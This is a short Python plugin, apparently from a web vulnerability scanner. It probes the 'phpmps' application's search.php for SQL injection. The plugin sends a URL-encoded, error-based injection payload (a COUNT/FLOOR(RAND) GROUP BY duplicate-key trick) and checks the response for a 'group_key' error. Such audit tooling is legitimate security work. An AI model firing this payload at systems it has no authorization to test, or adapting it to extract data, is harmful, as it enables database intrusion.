#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "phpmps":
        return True, arg

def audit(arg):
	payload = "/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20COUNT(*),CONCAT(md5(3.14),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+'search.php')

if __name__ == "__main__":
	from dummy import *
	audit(assign('phpmps', 'http://www.example.com/')[1])